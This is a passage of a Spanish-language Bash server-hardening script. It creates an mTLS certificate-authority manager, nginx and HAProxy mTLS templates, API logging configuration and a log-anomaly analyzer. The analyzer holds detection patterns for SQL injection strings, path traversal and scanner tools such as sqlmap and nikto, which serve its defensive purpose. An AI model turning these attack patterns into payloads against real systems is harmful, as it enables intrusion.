            *)      echo "Provider no soportado: $provider"; show_help; exit 1 ;;
        esac
        ;;
    test)     run_test ;;
    setup)    setup_provider "$@" ;;
    ip-check) ip_check "$@" ;;
    help|*)   show_help ;;
esac
EOFWEBHOOK
    chmod +x "$WEBHOOK_SCRIPT"
    log_change "Creado" "$WEBHOOK_SCRIPT"
    log_change "Permisos" "$WEBHOOK_SCRIPT -> +x"

    # ── Crear whitelist base ─────────────────────────────────
    if [[ ! -f "$WHITELIST_FILE" ]]; then
        mkdir -p "$(dirname "$WHITELIST_FILE")"
        cat > "$WHITELIST_FILE" << 'EOF'
# ============================================================
# webhook-ip-whitelist.conf - IPs permitidas para webhooks
# Generado por securizar - Modulo 63
# ============================================================
127.0.0.1
::1
EOF
        log_change "Creado" "$WHITELIST_FILE"
    fi

    # ── Directorio de secrets ────────────────────────────────
    mkdir -p /etc/securizar/webhook-secrets
    chmod 700 /etc/securizar/webhook-secrets
    log_change "Creado" "/etc/securizar/webhook-secrets/ (permisos 700)"

    log_info "Verificacion de webhooks configurada"
    log_info "Ejecuta: verificar-webhooks.sh test"
else
    log_skip "Webhook signature verification"
fi

# ============================================================
# S8: mTLS PARA MICROSERVICIOS
# ============================================================
log_section "S8: mTLS para microservicios"

log_info "Configura mutual TLS (mTLS) para comunicacion entre servicios:"
log_info "  - Script de gestion de CA y certificados"
log_info "  - Generacion y rotacion de certificados cliente"
log_info "  - CRL (Certificate Revocation List)"
log_info "  - Templates de configuracion nginx/HAProxy"
echo ""

if check_file_exists /usr/local/bin/gestionar-mtls.sh; then
    log_already "mTLS para microservicios (gestionar-mtls.sh existe)"
elif ask "¿Configurar mTLS para microservicios?"; then

    # ── Politica mTLS ────────────────────────────────────────
    MTLS_POLICY="/etc/securizar/mtls-policy.conf"
    if [[ -f "$MTLS_POLICY" ]]; then
        cp -a "$MTLS_POLICY" "$BACKUP_DIR/" 2>/dev/null || true
    fi

    cat > "$MTLS_POLICY" << 'EOF'
# ============================================================
# mtls-policy.conf - Politica de mTLS para microservicios
# Generado por securizar - Modulo 63
# ============================================================

# ── CA Configuration ─────────────────────────────────────────
MTLS_CA_DIR="/etc/securizar/mtls-ca"
MTLS_CA_DAYS=3650
MTLS_CA_KEY_SIZE=4096
MTLS_CA_SUBJECT="/C=ES/ST=Madrid/L=Madrid/O=Securizar/OU=Security/CN=Securizar Internal CA"

# ── Certificate Configuration ────────────────────────────────
MTLS_CERT_DAYS=365
MTLS_CERT_KEY_SIZE=2048
MTLS_CERT_DIGEST="sha256"

# ── Rotation ─────────────────────────────────────────────────
MTLS_ROTATION_DAYS=90
MTLS_ROTATION_OVERLAP_DAYS=30
MTLS_AUTO_ROTATE=false

# ── CRL ──────────────────────────────────────────────────────
MTLS_CRL_DAYS=30
MTLS_CRL_DISTRIBUTION_POINT=""

# ── Verification ─────────────────────────────────────────────
MTLS_VERIFY_CLIENT=true
MTLS_VERIFY_DEPTH=2
MTLS_REQUIRE_CLIENT_CERT=true

# ── Allowed Services ────────────────────────────────────────
# Lista de servicios autorizados para certificados (CN)
MTLS_ALLOWED_SERVICES="api-gateway,auth-service,user-service,payment-service,notification-service"
EOF
    log_change "Creado" "$MTLS_POLICY"

    # ── Script de gestion mTLS ───────────────────────────────
    MTLS_SCRIPT="/usr/local/bin/gestionar-mtls.sh"
    if [[ -f "$MTLS_SCRIPT" ]]; then
        cp -a "$MTLS_SCRIPT" "$BACKUP_DIR/" 2>/dev/null || true
    fi

    cat > "$MTLS_SCRIPT" << 'EOFMTLS'
#!/bin/bash
# ============================================================
# gestionar-mtls.sh - Gestion de mTLS para microservicios
# Generado por securizar - Modulo 63
# ============================================================
# Uso: gestionar-mtls.sh {init-ca|gen-cert|revoke|renew|status|verify}
# ============================================================
set -uo pipefail

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

POLICY="/etc/securizar/mtls-policy.conf"

# Cargar politica
if [[ -f "$POLICY" ]]; then
    source "$POLICY" 2>/dev/null || true
fi

CA_DIR="${MTLS_CA_DIR:-/etc/securizar/mtls-ca}"
CA_DAYS="${MTLS_CA_DAYS:-3650}"
CA_KEY_SIZE="${MTLS_CA_KEY_SIZE:-4096}"
CA_SUBJECT="${MTLS_CA_SUBJECT:-/C=ES/ST=Madrid/L=Madrid/O=Securizar/OU=Security/CN=Securizar Internal CA}"
CERT_DAYS="${MTLS_CERT_DAYS:-365}"
CERT_KEY_SIZE="${MTLS_CERT_KEY_SIZE:-2048}"
CRL_DAYS="${MTLS_CRL_DAYS:-30}"

ACTION="${1:-help}"

# ── Init CA ──────────────────────────────────────────────────
init_ca() {
    echo -e "${BOLD}Inicializando CA para mTLS...${NC}"

    if [[ -f "$CA_DIR/ca.key" ]]; then
        echo -e "${YELLOW}CA ya existe en $CA_DIR${NC}"
        echo -e "Usa --force para reinicializar"
        if [[ "${2:-}" != "--force" ]]; then
            return 1
        fi
        echo -e "${YELLOW}Reinicializando CA...${NC}"
    fi

    mkdir -p "$CA_DIR"/{certs,private,newcerts,crl}
    chmod 700 "$CA_DIR/private"
    touch "$CA_DIR/index.txt"
    echo "1000" > "$CA_DIR/serial"
    echo "1000" > "$CA_DIR/crlnumber"

    # Generar clave CA
    echo -e "${CYAN}Generando clave CA (${CA_KEY_SIZE} bits)...${NC}"
    openssl genrsa -out "$CA_DIR/private/ca.key" "$CA_KEY_SIZE" 2>/dev/null
    chmod 400 "$CA_DIR/private/ca.key"

    # Generar certificado CA
    openssl req -new -x509 -days "$CA_DAYS" \
        -key "$CA_DIR/private/ca.key" \
        -out "$CA_DIR/certs/ca.crt" \
        -subj "$CA_SUBJECT" 2>/dev/null

    # Crear configuracion OpenSSL
    cat > "$CA_DIR/openssl.cnf" << 'EOFSSL'
[ca]
default_ca = CA_default

[CA_default]
dir               = CADIR_PLACEHOLDER
certs             = $dir/certs
crl_dir           = $dir/crl
new_certs_dir     = $dir/newcerts
database          = $dir/index.txt
serial            = $dir/serial
crlnumber         = $dir/crlnumber
private_key       = $dir/private/ca.key
certificate       = $dir/certs/ca.crt
default_days      = 365
default_md        = sha256
preserve          = no
policy            = policy_match
copy_extensions   = copy

[policy_match]
countryName             = optional
stateOrProvinceName     = optional
organizationName        = optional
organizationalUnitName  = optional
commonName              = supplied
emailAddress            = optional

[req]
default_bits        = 2048
distinguished_name  = req_distinguished_name
string_mask         = utf8only
default_md          = sha256

[req_distinguished_name]
countryName                     = Country Name (2 letter code)
stateOrProvinceName             = State or Province Name
localityName                    = Locality Name
organizationName                = Organization Name
organizationalUnitName          = Organizational Unit Name
commonName                      = Common Name
emailAddress                    = Email Address

[v3_client]
basicConstraints = CA:FALSE
nsCertType = client
nsComment = "Securizar mTLS Client Certificate"
subjectKeyIdentifier = hash
authorityKeyIdentifier = keyid,issuer
keyUsage = critical, nonRepudiation, digitalSignature, keyEncipherment
extendedKeyUsage = clientAuth

[v3_server]
basicConstraints = CA:FALSE
nsCertType = server
nsComment = "Securizar mTLS Server Certificate"
subjectKeyIdentifier = hash
authorityKeyIdentifier = keyid,issuer
keyUsage = critical, digitalSignature, keyEncipherment
extendedKeyUsage = serverAuth
EOFSSL

    # Reemplazar placeholder
    sed -i "s|CADIR_PLACEHOLDER|${CA_DIR}|g" "$CA_DIR/openssl.cnf"

    # Generar CRL inicial
    openssl ca -config "$CA_DIR/openssl.cnf" -gencrl \
        -out "$CA_DIR/crl/ca.crl" 2>/dev/null || true

    echo -e "${GREEN}CA inicializada en $CA_DIR${NC}"
    echo -e "  CA Cert: $CA_DIR/certs/ca.crt"
    echo -e "  CA Key:  $CA_DIR/private/ca.key"
}

# ── Generate Client Certificate ──────────────────────────────
gen_cert() {
    local service_name="${2:-}"
    local cert_type="${3:-client}"

    if [[ -z "$service_name" ]]; then
        echo "Uso: $0 gen-cert SERVICE_NAME [client|server]"
        exit 1
    fi

    if [[ ! -f "$CA_DIR/private/ca.key" ]]; then
        echo -e "${RED}CA no inicializada. Ejecuta: $0 init-ca${NC}"
        exit 1
    fi

    local cert_dir="$CA_DIR/certs/$service_name"
    mkdir -p "$cert_dir"

    echo -e "${CYAN}Generando certificado $cert_type para: $service_name${NC}"

    # Generar clave
    openssl genrsa -out "$cert_dir/${service_name}.key" "$CERT_KEY_SIZE" 2>/dev/null
    chmod 400 "$cert_dir/${service_name}.key"

    # Generar CSR
    openssl req -new \
        -key "$cert_dir/${service_name}.key" \
        -out "$cert_dir/${service_name}.csr" \
        -subj "/CN=${service_name}/O=Securizar/OU=Microservices" 2>/dev/null

    # Firmar con CA
    local ext_section="v3_client"
    [[ "$cert_type" == "server" ]] && ext_section="v3_server"

    openssl ca -config "$CA_DIR/openssl.cnf" -batch \
        -extensions "$ext_section" \
        -days "$CERT_DAYS" \
        -in "$cert_dir/${service_name}.csr" \
        -out "$cert_dir/${service_name}.crt" 2>/dev/null

    # Crear bundle
    cat "$cert_dir/${service_name}.crt" "$CA_DIR/certs/ca.crt" > "$cert_dir/${service_name}-bundle.crt"

    echo -e "${GREEN}Certificado generado:${NC}"
    echo -e "  Cert:   $cert_dir/${service_name}.crt"
    echo -e "  Key:    $cert_dir/${service_name}.key"
    echo -e "  Bundle: $cert_dir/${service_name}-bundle.crt"
    echo -e "  Expira: $(openssl x509 -in "$cert_dir/${service_name}.crt" -noout -enddate 2>/dev/null | cut -d= -f2)"
}

# ── Revoke Certificate ───────────────────────────────────────
revoke_cert() {
    local service_name="${2:-}"
    if [[ -z "$service_name" ]]; then
        echo "Uso: $0 revoke SERVICE_NAME"
        exit 1
    fi

    local cert_file="$CA_DIR/certs/$service_name/${service_name}.crt"
    if [[ ! -f "$cert_file" ]]; then
        echo -e "${RED}Certificado no encontrado: $cert_file${NC}"
        exit 1
    fi

    echo -e "${YELLOW}Revocando certificado de: $service_name${NC}"
    openssl ca -config "$CA_DIR/openssl.cnf" -revoke "$cert_file" 2>/dev/null

    # Regenerar CRL
    openssl ca -config "$CA_DIR/openssl.cnf" -gencrl \
        -out "$CA_DIR/crl/ca.crl" 2>/dev/null

    echo -e "${GREEN}Certificado revocado y CRL actualizada${NC}"
}

# ── Renew Certificate ────────────────────────────────────────
renew_cert() {
    local service_name="${2:-}"
    if [[ -z "$service_name" ]]; then
        echo "Uso: $0 renew SERVICE_NAME"
        exit 1
    fi

    echo -e "${CYAN}Renovando certificado de: $service_name${NC}"

    # Revocar el anterior
    local old_cert="$CA_DIR/certs/$service_name/${service_name}.crt"
    if [[ -f "$old_cert" ]]; then
        # Backup del anterior
        cp "$old_cert" "$old_cert.$(date +%Y%m%d%H%M%S).bak"
        openssl ca -config "$CA_DIR/openssl.cnf" -revoke "$old_cert" 2>/dev/null || true
    fi

    # Generar nuevo
    gen_cert "$0" "$service_name"

    # Regenerar CRL
    openssl ca -config "$CA_DIR/openssl.cnf" -gencrl \
        -out "$CA_DIR/crl/ca.crl" 2>/dev/null || true

    echo -e "${GREEN}Certificado renovado${NC}"
}

# ── Status ───────────────────────────────────────────────────
show_status() {
    echo -e "${BOLD}══════════════════════════════════════════${NC}"
    echo -e "${BOLD}  ESTADO mTLS${NC}"
    echo -e "${BOLD}══════════════════════════════════════════${NC}"
    echo ""

    if [[ ! -d "$CA_DIR" ]]; then
        echo -e "${RED}CA no inicializada${NC}"
        echo "Ejecuta: $0 init-ca"
        return
    fi

    # CA info
    echo -e "${CYAN}── CA ──${NC}"
    if [[ -f "$CA_DIR/certs/ca.crt" ]]; then
        echo -e "  ${GREEN}CA activa${NC}"
        local ca_expiry
        ca_expiry=$(openssl x509 -in "$CA_DIR/certs/ca.crt" -noout -enddate 2>/dev/null | cut -d= -f2)
        echo -e "  Expira: $ca_expiry"
        local ca_subject
        ca_subject=$(openssl x509 -in "$CA_DIR/certs/ca.crt" -noout -subject 2>/dev/null | sed 's/subject=//')
        echo -e "  Subject: $ca_subject"
    fi

    # Certificados emitidos
    echo ""
    echo -e "${CYAN}── Certificados emitidos ──${NC}"
    if [[ -f "$CA_DIR/index.txt" ]]; then
        local valid_count=0 revoked_count=0
        while IFS=$'\t' read -r status expiry serial unknown cn _rest; do
            case "$status" in
                V) ((valid_count++)) || true; echo -e "  ${GREEN}[V]${NC} $cn (expira: $expiry, serial: $serial)" ;;
                R) ((revoked_count++)) || true; echo -e "  ${RED}[R]${NC} $cn (serial: $serial)" ;;
            esac
        done < "$CA_DIR/index.txt"
        echo ""
        echo -e "  Total: $((valid_count + revoked_count)) | ${GREEN}Validos: $valid_count${NC} | ${RED}Revocados: $revoked_count${NC}"
    else
        echo -e "  Sin certificados emitidos"
    fi

    # CRL
    echo ""
    echo -e "${CYAN}── CRL ──${NC}"
    if [[ -f "$CA_DIR/crl/ca.crl" ]]; then
        local crl_date
        crl_date=$(openssl crl -in "$CA_DIR/crl/ca.crl" -noout -lastupdate 2>/dev/null | cut -d= -f2)
        echo -e "  Ultima actualizacion: $crl_date"
    else
        echo -e "  ${YELLOW}CRL no generada${NC}"
    fi
}

# ── Verify ───────────────────────────────────────────────────
verify_cert() {
    local cert_file="${2:-}"
    if [[ -z "$cert_file" ]]; then
        echo "Uso: $0 verify CERT_FILE"
        exit 1
    fi

    if [[ ! -f "$cert_file" ]]; then
        echo -e "${RED}Archivo no encontrado: $cert_file${NC}"
        exit 1
    fi

    echo -e "${BOLD}Verificando certificado: $cert_file${NC}"

    if openssl verify -CAfile "$CA_DIR/certs/ca.crt" -crl_check -CRLfile "$CA_DIR/crl/ca.crl" "$cert_file" 2>/dev/null; then
        echo -e "${GREEN}[VALID]${NC} Certificado valido"
    else
        echo -e "${RED}[INVALID]${NC} Certificado no valido"
    fi

    echo ""
    openssl x509 -in "$cert_file" -noout -subject -issuer -dates -serial 2>/dev/null
}

# ── Help ─────────────────────────────────────────────────────
show_help() {
    echo "Uso: $0 {init-ca|gen-cert|revoke|renew|status|verify|help}"
    echo ""
    echo "Comandos:"
    echo "  init-ca [--force]              Inicializar Certificate Authority"
    echo "  gen-cert SERVICE [client|server] Generar certificado"
    echo "  revoke SERVICE                 Revocar certificado"
    echo "  renew SERVICE                  Renovar certificado"
    echo "  status                         Mostrar estado de la CA"
    echo "  verify CERT_FILE               Verificar un certificado"
    echo ""
}

case "$ACTION" in
    init-ca)  init_ca "$@" ;;
    gen-cert) gen_cert "$@" ;;
    revoke)   revoke_cert "$@" ;;
    renew)    renew_cert "$@" ;;
    status)   show_status ;;
    verify)   verify_cert "$@" ;;
    help|*)   show_help ;;
esac
EOFMTLS
    chmod +x "$MTLS_SCRIPT"
    log_change "Creado" "$MTLS_SCRIPT"
    log_change "Permisos" "$MTLS_SCRIPT -> +x"

    # ── Nginx mTLS template ──────────────────────────────────
    NGINX_MTLS="/etc/securizar/api-gateway/nginx-mtls.conf"
    if [[ -f "$NGINX_MTLS" ]]; then
        cp -a "$NGINX_MTLS" "$BACKUP_DIR/" 2>/dev/null || true
    fi

    cat > "$NGINX_MTLS" << 'EOF'
# ============================================================
# nginx-mtls.conf - mTLS configuration template (nginx)
# Generado por securizar - Modulo 63
# Incluir dentro de server { } blocks para servicios internos
# ============================================================

# ── CA y verificacion de cliente ─────────────────────────────
ssl_client_certificate /etc/securizar/mtls-ca/certs/ca.crt;
ssl_verify_client on;
ssl_verify_depth 2;
ssl_crl /etc/securizar/mtls-ca/crl/ca.crl;

# ── Pasar info del certificado al backend ────────────────────
proxy_set_header X-SSL-Client-DN $ssl_client_s_dn;
proxy_set_header X-SSL-Client-Serial $ssl_client_serial;
proxy_set_header X-SSL-Client-Verify $ssl_client_verify;
proxy_set_header X-SSL-Client-Fingerprint $ssl_client_fingerprint;

# ── Denegar si certificado no valido ────────────────────────
if ($ssl_client_verify != SUCCESS) {
    return 403;
}
EOF
    log_change "Creado" "$NGINX_MTLS"

    # ── HAProxy mTLS template ────────────────────────────────
    HAPROXY_MTLS="/etc/securizar/api-gateway/haproxy-mtls.cfg"
    if [[ -f "$HAPROXY_MTLS" ]]; then
        cp -a "$HAPROXY_MTLS" "$BACKUP_DIR/" 2>/dev/null || true
    fi

    cat > "$HAPROXY_MTLS" << 'EOF'
# ============================================================
# haproxy-mtls.cfg - mTLS configuration template (HAProxy)
# Generado por securizar - Modulo 63
# ============================================================

frontend mtls_frontend
    bind *:8443 ssl crt /etc/haproxy/certs/server.pem ca-file /etc/securizar/mtls-ca/certs/ca.crt verify required crl-file /etc/securizar/mtls-ca/crl/ca.crl

    # Pasar info del certificado cliente
    http-request set-header X-SSL-Client-DN %{+Q}[ssl_c_s_dn]
    http-request set-header X-SSL-Client-Serial %[ssl_c_serial,hex]
    http-request set-header X-SSL-Client-Verify %[ssl_c_verify]

    # Denegar si verificacion falla
    http-request deny if ! { ssl_c_verify 0 }

    default_backend internal_services

backend internal_services
    mode http
    balance roundrobin
    server svc1 127.0.0.1:8080 check
EOF
    log_change "Creado" "$HAPROXY_MTLS"

    log_info "mTLS para microservicios configurado"
    log_info "Ejecuta: gestionar-mtls.sh init-ca"
    log_info "Luego:   gestionar-mtls.sh gen-cert nombre-servicio"
else
    log_skip "mTLS para microservicios"
fi

# ============================================================
# S9: API LOGGING Y AUDIT TRAILS
# ============================================================
log_section "S9: API logging y audit trails"

log_info "Configura logging avanzado para APIs:"
log_info "  - JSON structured logging"
log_info "  - Enmascaramiento de datos sensibles"
log_info "  - Metricas de rendimiento"
log_info "  - Rotacion de logs"
log_info "  - Script de analisis de anomalias"
echo ""

if check_file_exists /usr/local/bin/analizar-logs-api.sh; then
    log_already "API logging y audit trails (analizar-logs-api.sh existe)"
elif ask "¿Configurar API logging y audit trails?"; then

    # ── Configuracion de logging ─────────────────────────────
    LOG_CONF="/etc/securizar/api-logging.conf"
    if [[ -f "$LOG_CONF" ]]; then
        cp -a "$LOG_CONF" "$BACKUP_DIR/" 2>/dev/null || true
    fi

    cat > "$LOG_CONF" << 'EOF'
# ============================================================
# api-logging.conf - Configuracion de API logging
# Generado por securizar - Modulo 63
# ============================================================

# ── General ──────────────────────────────────────────────────
LOG_FORMAT=json
LOG_DIR=/var/log/securizar/api
LOG_LEVEL=info
LOG_INCLUDE_REQUEST_BODY=false
LOG_INCLUDE_RESPONSE_BODY=false
LOG_INCLUDE_HEADERS=true

# ── Enmascaramiento de datos sensibles ───────────────────────
MASK_FIELDS="password,token,secret,api_key,authorization,credit_card,ssn,cvv"
MASK_PATTERN="***REDACTED***"
MASK_HEADERS="Authorization,X-API-Key,Cookie,Set-Cookie"

# ── Metricas ─────────────────────────────────────────────────
LOG_RESPONSE_TIME=true
LOG_REQUEST_SIZE=true
LOG_RESPONSE_SIZE=true
LOG_UPSTREAM_TIME=true

# ── Retenciones ──────────────────────────────────────────────
LOG_RETENTION_DAYS=90
LOG_ROTATE_SIZE=100M
LOG_ROTATE_COUNT=30
LOG_COMPRESS=true

# ── Alertas ──────────────────────────────────────────────────
ALERT_ON_5XX=true
ALERT_ON_401=true
ALERT_ON_403=true
ALERT_ON_429=true
ALERT_THRESHOLD_5XX_PER_MINUTE=10
ALERT_THRESHOLD_401_PER_MINUTE=20
ALERT_THRESHOLD_403_PER_MINUTE=15
EOF
    log_change "Creado" "$LOG_CONF"

    # ── Directorio de logs ───────────────────────────────────
    mkdir -p /var/log/securizar/api
    chmod 750 /var/log/securizar/api
    log_change "Creado" "/var/log/securizar/api/ (permisos 750)"

    # ── Logrotate para API logs ──────────────────────────────
    LOGROTATE_CONF="/etc/logrotate.d/securizar-api"
    if [[ -f "$LOGROTATE_CONF" ]]; then
        cp -a "$LOGROTATE_CONF" "$BACKUP_DIR/" 2>/dev/null || true
    fi

    cat > "$LOGROTATE_CONF" << 'EOF'
# Logrotate para API logs - securizar Modulo 63

/var/log/securizar/api/*.log
/var/log/securizar/api/*.json {
    daily
    missingok
    rotate 30
    compress
    delaycompress
    notifempty
    create 0640 root adm
    sharedscripts
    postrotate
        # Recargar nginx si esta corriendo
        if [ -f /var/run/nginx.pid ]; then
            kill -USR1 $(cat /var/run/nginx.pid) 2>/dev/null || true
        fi
        # Recargar rsyslog si esta corriendo
        systemctl reload rsyslog 2>/dev/null || true
    endscript
}
EOF
    log_change "Creado" "$LOGROTATE_CONF"

    # ── Configuracion rsyslog para API logs ──────────────────
    RSYSLOG_API="/etc/rsyslog.d/60-securizar-api.conf"
    if [[ -f "$RSYSLOG_API" ]]; then
        cp -a "$RSYSLOG_API" "$BACKUP_DIR/" 2>/dev/null || true
    fi

    if [[ -d /etc/rsyslog.d ]]; then
        cat > "$RSYSLOG_API" << 'EOF'
# ============================================================
# 60-securizar-api.conf - rsyslog config para API logs
# Generado por securizar - Modulo 63
# ============================================================

# Template JSON para API events
template(name="api-json" type="list") {
    constant(value="{")
    constant(value="\"timestamp\":\"")     property(name="timereported" dateFormat="rfc3339")
    constant(value="\",\"host\":\"")       property(name="hostname")
    constant(value="\",\"severity\":\"")   property(name="syslogseverity-text")
    constant(value="\",\"facility\":\"")   property(name="syslogfacility-text")
    constant(value="\",\"tag\":\"")        property(name="syslogtag")
    constant(value="\",\"message\":\"")    property(name="msg" format="jsonf")
    constant(value="\"}\n")
}

# Capturar logs API
if $programname == 'api-gateway' or $syslogtag startswith 'api-' then {
    action(type="omfile"
           file="/var/log/securizar/api/api-syslog.json"
           template="api-json"
           fileOwner="root"
           fileGroup="adm"
           fileCreateMode="0640")
    stop
}
EOF
        log_change "Creado" "$RSYSLOG_API"
    fi

    # ── Script de analisis de logs ───────────────────────────
    LOG_ANALYZER="/usr/local/bin/analizar-logs-api.sh"
    if [[ -f "$LOG_ANALYZER" ]]; then
        cp -a "$LOG_ANALYZER" "$BACKUP_DIR/" 2>/dev/null || true
    fi

    cat > "$LOG_ANALYZER" << 'EOFLOGANALYZER'
#!/bin/bash
# ============================================================
# analizar-logs-api.sh - Analisis de logs API y deteccion de anomalias
# Generado por securizar - Modulo 63
# ============================================================
# Uso: analizar-logs-api.sh [--today|--yesterday|--week|--file FILE]
# ============================================================
set -uo pipefail

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; DIM='\033[2m'; NC='\033[0m'

PERIOD="${1:---today}"
LOG_DIR="/var/log/securizar/api"
ALERTS=0

echo -e "${BOLD}══════════════════════════════════════════${NC}"
echo -e "${BOLD}  ANALISIS DE LOGS API${NC}"
echo -e "${BOLD}══════════════════════════════════════════${NC}"
echo ""

# Determinar archivo de log
LOG_FILE=""
case "$PERIOD" in
    --today)     LOG_FILE="$LOG_DIR/api-access.json"
                 echo -e "${CYAN}Periodo: Hoy${NC}" ;;
    --yesterday) LOG_FILE="$LOG_DIR/api-access.json.1"
                 echo -e "${CYAN}Periodo: Ayer${NC}" ;;
    --week)      LOG_FILE="$LOG_DIR/api-access.json"
                 echo -e "${CYAN}Periodo: Ultima semana${NC}" ;;
    --file)      LOG_FILE="${2:-}"
                 echo -e "${CYAN}Archivo: $LOG_FILE${NC}" ;;
    *)           echo "Uso: $0 [--today|--yesterday|--week|--file FILE]"; exit 1 ;;
esac

# Verificar tambien logs nginx
NGINX_LOG="/var/log/nginx/api-access.json"
if [[ ! -f "$LOG_FILE" ]] && [[ -f "$NGINX_LOG" ]]; then
    LOG_FILE="$NGINX_LOG"
    echo -e "${DIM}Usando log nginx: $LOG_FILE${NC}"
fi

if [[ ! -f "$LOG_FILE" ]]; then
    echo -e "${YELLOW}Log no encontrado: $LOG_FILE${NC}"
    echo -e "Buscando logs disponibles..."
    find "$LOG_DIR" /var/log/nginx -name "*api*" -type f 2>/dev/null | head -10
    exit 1
fi

echo ""
TOTAL_LINES=$(wc -l < "$LOG_FILE" 2>/dev/null || echo "0")
echo -e "${CYAN}Total registros: $TOTAL_LINES${NC}"
echo ""

# ── 1. Status codes distribution ────────────────────────────
echo -e "${CYAN}── 1. Distribucion de codigos HTTP ──${NC}"
if command -v jq &>/dev/null; then
    jq -r '.status // empty' "$LOG_FILE" 2>/dev/null | sort | uniq -c | sort -rn | head -20 | while read -r count code; do
        if [[ "$code" =~ ^5 ]]; then
            echo -e "  ${RED}${code}${NC}: ${count} requests"
            ((ALERTS++)) || true
        elif [[ "$code" =~ ^4 ]]; then
            echo -e "  ${YELLOW}${code}${NC}: ${count} requests"
        else
            echo -e "  ${GREEN}${code}${NC}: ${count} requests"
        fi
    done
else
    grep -oP '"status"\s*:\s*\K[0-9]+' "$LOG_FILE" 2>/dev/null | sort | uniq -c | sort -rn | head -20 | while read -r count code; do
        echo -e "  ${code}: ${count} requests"
    done
fi

# ── 2. Top IPs ──────────────────────────────────────────────
echo ""
echo -e "${CYAN}── 2. Top 10 IPs ──${NC}"
if command -v jq &>/dev/null; then
    jq -r '.remote_addr // empty' "$LOG_FILE" 2>/dev/null | sort | uniq -c | sort -rn | head -10 | while read -r count ip; do
        if [[ $count -gt 1000 ]]; then
            echo -e "  ${RED}${ip}${NC}: ${count} requests (posible abuso)"
            ((ALERTS++)) || true
        elif [[ $count -gt 500 ]]; then
            echo -e "  ${YELLOW}${ip}${NC}: ${count} requests"
        else
            echo -e "  ${GREEN}${ip}${NC}: ${count} requests"
        fi
    done
else
    grep -oP '"remote_addr"\s*:\s*"\K[^"]+' "$LOG_FILE" 2>/dev/null | sort | uniq -c | sort -rn | head -10 | while read -r count ip; do
        echo -e "  ${ip}: ${count} requests"
    done
fi

# ── 3. Top endpoints ────────────────────────────────────────
echo ""
echo -e "${CYAN}── 3. Top 10 endpoints ──${NC}"
if command -v jq &>/dev/null; then
    jq -r '.request_uri // empty' "$LOG_FILE" 2>/dev/null | sort | uniq -c | sort -rn | head -10 | while read -r count uri; do
        echo -e "  ${count}\t${uri}"
    done
else
    grep -oP '"request_uri"\s*:\s*"\K[^"]+' "$LOG_FILE" 2>/dev/null | sort | uniq -c | sort -rn | head -10 | while read -r count uri; do
        echo -e "  ${count}\t${uri}"
    done
fi

# ── 4. Errores 4xx/5xx ──────────────────────────────────────
echo ""
echo -e "${CYAN}── 4. Errores 4xx/5xx por endpoint ──${NC}"
if command -v jq &>/dev/null; then
    jq -r 'select(.status >= 400) | "\(.status) \(.request_method) \(.request_uri)"' "$LOG_FILE" 2>/dev/null | sort | uniq -c | sort -rn | head -15 | while read -r count status method uri; do
        if [[ "$status" =~ ^5 ]]; then
            echo -e "  ${RED}[${count}x]${NC} ${status} ${method} ${uri}"
        else
            echo -e "  ${YELLOW}[${count}x]${NC} ${status} ${method} ${uri}"
        fi
    done
fi

# ── 5. Slow requests ────────────────────────────────────────
echo ""
echo -e "${CYAN}── 5. Requests lentos (>2s) ──${NC}"
if command -v jq &>/dev/null; then
    jq -r 'select(.request_time > 2) | "\(.request_time)s \(.request_method) \(.request_uri)"' "$LOG_FILE" 2>/dev/null | sort -rn | head -10 | while IFS= read -r line; do
        echo -e "  ${YELLOW}${line}${NC}"
    done
    slow_count=$(jq -r 'select(.request_time > 2) | .request_time' "$LOG_FILE" 2>/dev/null | wc -l || echo "0")
    echo -e "  Total requests >2s: $slow_count"
fi

# ── 6. Patrones sospechosos ──────────────────────────────────
echo ""
echo -e "${CYAN}── 6. Patrones sospechosos ──${NC}"

# SQL injection attempts
sqli_count=$(grep -ciE "union.*select|drop.*table|insert.*into|sleep\(|benchmark\(|waitfor|0x[0-9a-f]{8}" "$LOG_FILE" 2>/dev/null || echo "0")
if [[ "$sqli_count" -gt 0 ]]; then
    echo -e "  ${RED}SQLi attempts: $sqli_count${NC}"
    ((ALERTS++)) || true
else
    echo -e "  ${GREEN}SQLi attempts: 0${NC}"
fi

# Path traversal
traversal_count=$(grep -ciE '\.\./|%2e%2e|%252e' "$LOG_FILE" 2>/dev/null || echo "0")
if [[ "$traversal_count" -gt 0 ]]; then
    echo -e "  ${RED}Path traversal attempts: $traversal_count${NC}"
    ((ALERTS++)) || true
else
    echo -e "  ${GREEN}Path traversal: 0${NC}"
fi

# Scanner patterns
scanner_count=$(grep -ciE 'nikto|sqlmap|nmap|burp|dirbuster|gobuster|wfuzz|ffuf' "$LOG_FILE" 2>/dev/null || echo "0")
if [[ "$scanner_count" -gt 0 ]]; then
    echo -e "  ${YELLOW}Scanner patterns: $scanner_count${NC}"
    ((ALERTS++)) || true
else
    echo -e "  ${GREEN}Scanner patterns: 0${NC}"
fi

# 401/403 brute force
auth_failures=$(grep -cP '"status"\s*:\s*(401|403)' "$LOG_FILE" 2>/dev/null || echo "0")
if [[ "$auth_failures" -gt 100 ]]; then
    echo -e "  ${RED}Auth failures (401/403): $auth_failures (posible brute force)${NC}"
    ((ALERTS++)) || true
elif [[ "$auth_failures" -gt 0 ]]; then
    echo -e "  ${YELLOW}Auth failures: $auth_failures${NC}"
else
    echo -e "  ${GREEN}Auth failures: 0${NC}"
fi

# Rate limited
rate_limited=$(grep -cP '"status"\s*:\s*429' "$LOG_FILE" 2>/dev/null || echo "0")
if [[ "$rate_limited" -gt 0 ]]; then
    echo -e "  ${YELLOW}Rate limited (429): $rate_limited${NC}"
else
    echo -e "  ${GREEN}Rate limited: 0${NC}"
fi

echo ""
echo -e "${BOLD}── Resumen ──${NC}"
echo -e "  Total registros: $TOTAL_LINES"
echo -e "  Alertas: $ALERTS"

if [[ $ALERTS -gt 0 ]]; then
    echo -e "\n${RED}Se detectaron $ALERTS tipo(s) de anomalias${NC}"
fi
EOFLOGANALYZER
    chmod +x "$LOG_ANALYZER"
    log_change "Creado" "$LOG_ANALYZER"
    log_change "Permisos" "$LOG_ANALYZER -> +x"

    log_info "API logging y audit trails configurado"
    log_info "Ejecuta: analizar-logs-api.sh --today"
else
    log_skip "API logging y audit trails"
fi

# ============================================================
# S10: AUDITORIA INTEGRAL DE SEGURIDAD API
# ============================================================
log_section "S10: Auditoria integral de seguridad API"

